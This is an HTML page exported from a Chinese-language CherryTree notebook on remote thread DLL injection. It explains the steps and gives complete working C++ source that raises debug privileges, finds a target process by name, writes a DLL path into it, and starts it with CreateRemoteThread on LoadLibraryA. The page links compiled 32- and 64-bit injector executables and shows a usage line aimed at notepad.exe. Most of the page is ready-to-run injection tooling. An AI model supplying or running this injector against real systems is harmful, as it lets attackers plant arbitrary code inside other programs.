<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>远程线程注入</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>远程线程注入</h1><br/>原理：<br />1、在对应进程中申请可读可写内存空间<br />2、在该空间写入LoadLibrary函数的参数，即调用的dll名称，带路径<br />3、通过CreateRemoteThread创建远程线程调用LoadLibraryA函数<br />4、调用函数的同时执行DllMain函数，实现注入<br /><br /><div class="codebox"><div class="codebox">#include&nbsp;&quot;stdlib.h&quot;<br />#include&lt;iostream&gt;<br />#include&lt;Windows.h&gt;<br />#include&lt;tchar.h&gt;<br />#include&lt;string&gt;<br />#include&nbsp;&lt;TlHelp32.h&gt;<br />using&nbsp;namespace&nbsp;std;<br /><br />//目标进程PID，DLL路径<br />BOOL&nbsp;Inject(DWORD&nbsp;dwProcessId,&nbsp;char*&nbsp;path)<br />{<br />	//打开注入进程获取句柄<br />	HANDLE&nbsp;hProcess&nbsp;=&nbsp;OpenProcess(PROCESS_ALL_ACCESS,&nbsp;FALSE,&nbsp;dwProcessId);<br /><br />	//在被注入进程内存中申请空间<br />	DWORD&nbsp;dwSize&nbsp;=&nbsp;lstrlen(path)&nbsp;+&nbsp;1;<br />	LPVOID&nbsp;pDllAddr&nbsp;=&nbsp;VirtualAllocEx(hProcess,&nbsp;NULL,&nbsp;dwSize,&nbsp;MEM_COMMIT,&nbsp;PAGE_READWRITE);<br />	//printf(&quot;%d\n&quot;,&nbsp;pDllAddr);<br />	//把DLL写入目标进程<br /><br />	BOOL&nbsp;iswrite&nbsp;=&nbsp;WriteProcessMemory(hProcess,&nbsp;pDllAddr,&nbsp;path,&nbsp;dwSize,&nbsp;NULL);<br /><br />	if&nbsp;(!iswrite)<br />		cout&nbsp;&lt;&lt;&nbsp;&quot;写入内存失败&quot;&nbsp;&lt;&lt;&nbsp;endl;<br />	//FARPROC&nbsp;pFuncProcAddr&nbsp;=&nbsp;::GetProcAddress(::GetModuleHandle(&quot;kernel32.dll&quot;),&nbsp;&quot;LoadLibraryA&quot;);<br />	//HANDLE&nbsp;hThread&nbsp;=&nbsp;CreateRemoteThread(hProcess,&nbsp;NULL,&nbsp;0,&nbsp;(LPTHREAD_START_ROUTINE)pFuncProcAddr,&nbsp;pDllAddr,&nbsp;0,&nbsp;NULL);<br />	//cout&nbsp;&lt;&lt;&nbsp;&quot;pFunc&quot;&nbsp;&lt;&lt;&nbsp;pFuncProcAddr&nbsp;&lt;&lt;&nbsp;endl;<br /><br />	//创建远程线程，调用LoadLibrary<br />	HANDLE&nbsp;hThread&nbsp;=&nbsp;CreateRemoteThread(hProcess,&nbsp;NULL,&nbsp;0,&nbsp;(LPTHREAD_START_ROUTINE)LoadLibraryA,&nbsp;pDllAddr,&nbsp;0,&nbsp;NULL);<br /><br />	//关闭句柄<br />	CloseHandle(hProcess);<br />	//释放虚拟内存空间<br />	VirtualFreeEx(hProcess,&nbsp;pDllAddr,&nbsp;1,&nbsp;MEM_DECOMMIT);<br />	return&nbsp;0;<br />}<br /><br />int&nbsp;EnableDebugPrivilege()<br />{<br />	//提权<br />	HANDLE&nbsp;token;<br />	TOKEN_PRIVILEGES&nbsp;tp;<br />	//打开进程令牌环<br />	if&nbsp;(!OpenProcessToken(GetCurrentProcess(),<br />		TOKEN_ADJUST_PRIVILEGES&nbsp;|&nbsp;TOKEN_QUERY,&nbsp;&amp;token))<br />	{<br />		cout&nbsp;&lt;&lt;&nbsp;&quot;open&nbsp;process&nbsp;token&nbsp;error!\n&quot;;<br />		return&nbsp;0;<br />	}<br />	//获得进程本地唯一ID<br />	LUID&nbsp;luid;<br />	if&nbsp;(!LookupPrivilegeValue(NULL,&nbsp;SE_DEBUG_NAME,&nbsp;&amp;luid))<br />	{<br />		cout&nbsp;&lt;&lt;&nbsp;&quot;lookup&nbsp;privilege&nbsp;value&nbsp;error!\n&quot;;<br />		return&nbsp;0;<br />	}<br />	tp.PrivilegeCount&nbsp;=&nbsp;1;<br />	tp.Privileges[0].Attributes&nbsp;=&nbsp;SE_PRIVILEGE_ENABLED;<br />	tp.Privileges[0].Luid&nbsp;=&nbsp;luid;<br />	//调整进程权限<br />	if&nbsp;(!AdjustTokenPrivileges(token,&nbsp;0,&nbsp;&amp;tp,&nbsp;sizeof(TOKEN_PRIVILEGES),&nbsp;NULL,&nbsp;NULL))<br />	{<br />		cout&nbsp;&lt;&lt;&nbsp;&quot;adjust&nbsp;token&nbsp;privilege&nbsp;error!\n&quot;;<br />		return&nbsp;0;<br />	}<br />	return&nbsp;1;<br />}<br /><br />DWORD&nbsp;GetPID(char&nbsp;*&nbsp;processName)<br />{<br />	PROCESSENTRY32&nbsp;entry;<br />	entry.dwSize&nbsp;=&nbsp;sizeof(PROCESSENTRY32);<br />	HANDLE&nbsp;snapshot&nbsp;=&nbsp;CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,&nbsp;NULL);//获得进程快照<br />	if&nbsp;(Process32First(snapshot,&nbsp;&amp;entry)&nbsp;==&nbsp;TRUE)<br />	{<br />		while&nbsp;(Process32Next(snapshot,&nbsp;&amp;entry)&nbsp;==&nbsp;TRUE)<br />		{<br />			if&nbsp;(strcmp(strupr(entry.szExeFile),&nbsp;strupr(processName))&nbsp;==&nbsp;0)<br />			{<br />				CloseHandle(snapshot);<br />				return&nbsp;entry.th32ProcessID;<br />			}<br />		}<br />	}<br />	CloseHandle(snapshot);<br />	return&nbsp;0;<br />}<br /><br />int&nbsp;_tmain(int&nbsp;argc,&nbsp;_TCHAR&nbsp;*argv[])<br />{<br /><br />	if&nbsp;(argc&nbsp;!=&nbsp;3)&nbsp;{<br />		printf(&quot;Usage:%s&nbsp;notepad.exe&nbsp;E:\\inject.dll\n&quot;,&nbsp;argv[0]);<br />		ExitProcess(0);<br />	}<br />	int&nbsp;flag&nbsp;=&nbsp;0;<br />	for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;strlen(argv[2]);&nbsp;i++)&nbsp;{<br />		if&nbsp;(argv[2][i]&nbsp;==&nbsp;&#39;\\&#39;&nbsp;||&nbsp;argv[2][i]&nbsp;==&nbsp;&#39;/&#39;)&nbsp;{<br />			flag&nbsp;=&nbsp;1;<br />		}<br />	}<br />	string&nbsp;strPath;<br />	if&nbsp;(flag)&nbsp;{<br />		strPath&nbsp;=&nbsp;argv[2];<br />	}<br />	else&nbsp;{<br />		//获取当前绝对路径<br />		TCHAR&nbsp;_szPath[MAX_PATH&nbsp;+&nbsp;1]&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />		GetModuleFileName(NULL,&nbsp;_szPath,&nbsp;MAX_PATH);<br />		(_tcsrchr(_szPath,&nbsp;_T(&#39;\\&#39;)))[1]&nbsp;=&nbsp;0;<br />		for&nbsp;(int&nbsp;n&nbsp;=&nbsp;0;&nbsp;_szPath[n];&nbsp;n++)<br />		{<br />			if&nbsp;(_szPath[n]&nbsp;!=&nbsp;_T(&#39;\\&#39;))<br />			{<br />				strPath&nbsp;+=&nbsp;_szPath[n];<br />			}<br />			else<br />			{<br />				strPath&nbsp;+=&nbsp;_T(&quot;\\\\&quot;);<br />			}<br />		}<br />		strPath&nbsp;+=&nbsp;argv[2];<br />	}<br /><br /><br /><br />	DWORD&nbsp;dwPid&nbsp;=&nbsp;GetPID(argv[1]);<br />	cout&nbsp;&lt;&lt;&nbsp;&quot;pid:\t&quot;&nbsp;&lt;&lt;&nbsp;dwPid&nbsp;&lt;&lt;&nbsp;endl;<br />	cout&nbsp;&lt;&lt;&nbsp;&quot;dll:\t&quot;&nbsp;&lt;&lt;&nbsp;strPath&nbsp;&lt;&lt;&nbsp;endl;<br />	EnableDebugPrivilege();<br /><br />	Inject(dwPid,&nbsp;_strdup(strPath.c_str()));<br /><br />	return&nbsp;0;<br />}<br /><br /></div></div><br /><br /><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\563-CreateRemoteThread64.exe">Linked file: CreateRemoteThread64.exe </a></td></tr></table><table style="display:inline-table"><tr><td><a href="EmbeddedFiles\563-CreateRemoteThread32.exe">Linked file: CreateRemoteThread32.exe </a></td></tr></table><br />CreateRemoteThread程序 DLL程序和被注入程序必须同时为64或86位<br /><br />用法：<br />CreateRemoteThread64.exe notepad.exe E:\inject.dll<br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>